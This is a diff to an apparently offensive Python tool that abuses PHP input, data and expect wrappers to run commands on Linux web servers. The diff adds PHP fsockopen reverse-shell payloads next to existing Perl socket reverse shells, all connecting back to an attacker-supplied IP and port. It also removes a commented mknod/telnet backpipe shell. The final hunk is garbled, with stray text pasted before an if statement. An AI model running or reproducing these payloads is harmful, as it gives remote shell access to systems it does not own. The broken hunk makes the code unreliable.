@@ -402,8 +402,6 @@ def checkPayload(webResponse):
 def printInfo(ip, port, shellType, attackMethod):
     print("[i] Sending reverse shell to {0}:{1} using {2} via {3}...".format(ip, port, shellType, attackMethod))
 
-#Todo exploitation using input, data,expect for windows OS
-#Todo bash, python, php,... rev shells
 def exploit(exploits, method):
     for i in range(len(exploits)):
         exploit = exploits[i]
@@ -416,6 +414,15 @@ def exploit(exploits, method):
             if(exploit['OS'] == 'LINUX'):
                 url = exploit['GETVAL']
                 
+                #PHP
+                u = url.replace('TMP', 'which%20php')
+                res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                if('/bin' in res.text and '/php' in res.text):
+                    phpPayload = "php+-r+'$sock%3dfsockopen(\"{0}\",{1})%3bexec(\"/bin/sh+-i+<%263+>%263+2>%263\")%3b'".format(ip, str(port))
+                    printInfo(ip, port, 'PHP', 'input wrapper')
+                    requests.post(url.replace('TMP', phpPayload), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                    return
+
                 #Perl
                 u = url.replace('TMP', 'which%20perl')
                 res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
@@ -423,7 +430,6 @@ def exploit(exploits, method):
                     perlPayload = "perl+-e+'use+Socket%3b$i%3d\"" + ip + "\"%3b$p%3d"+str(port)+"%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\")%3bopen(STDOUT,\">%26S\")%3bopen(STDERR,\">%26S\")%3bexec(\"/bin/sh+-i\")%3b}%3b'"
                     
                     u = url.replace('TMP', perlPayload)
-                    print(perlPayload)
                     printInfo(ip, port, 'perl', 'input wrapper')
                     requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                     return
@@ -477,6 +483,15 @@ def exploit(exploits, method):
             if(exploit['OS'] == 'LINUX'):
                 url = exploit['GETVAL']
                
+                #PHP
+                u = url.replace('TMP', 'which%20php')
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if('/bin' in res.text and '/php' in res.text):
+                    printInfo(ip, port, 'PHP', 'data wrapper')
+                    phpPayload = "php+-r+'$sock%3dfsockopen(\"{0}\",{1})%3bexec(\"/bin/sh+-i+<%263+>%263+2>%263\")%3b'".format(ip, str(port))
+                    requests.get(url.replace('TMP', phpPayload), headers = headers, proxies = proxies)
+                    return
+
                 #Perl
                 u = url.replace('TMP', 'which%20perl')
                 res = requests.get(u, headers = headers, proxies = proxies)
@@ -534,6 +549,15 @@ def exploit(exploits, method):
             if(exploit['OS' == 'LINUX']):
                 url = exploit['GETVAL']
                
+                #PHP
+                u = url.replace('TMP', 'which%20php')
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if('/bin' in res.text and '/php' in res.text):
+                    printInfo(ip, port, 'PHP', 'expect wrapper')
+                    phpPayload = "php+-r+'$sock%3dfsockopen(\"{0}\",{1})%3bexec(\"/bin/sh+-i+<%263+>%263+2>%263\")%3b'".format(ip, str(port))
+                    requests.get(url.replace('TMP', phpPayload), headers = headers, proxies = proxies)
+                    return
+
                 #Perl
                 u = url.replace('TMP', 'which%20perl')
                 res = requests.get(u, headers = headers, proxies = proxies)
@@ -618,8 +642,6 @@ def exploit(exploits, method):
             #res = requests.get(u, headers = headers, proxies = proxies)
             pass
                 
-#mknod backpipe p && telnet 192.168.80.129 80 0<backpipe | /bin/bash 1>backpipe
-
 def main():
     global exploits
     global proxies
@@ -718,7 +740,7 @@ if(__name__ == "__main__"):
     r'(?::\d+)?' # optional port
     r'(?:/?|[/?]\S+)$', re.IGNORECASE)
     
-    if(re.match(urlRegex, url) is None):
+data wrapper..    if(re.match(urlRegex, url) is None):
         print("URL not valid, exiting...")
         sys.exit(-1)
     
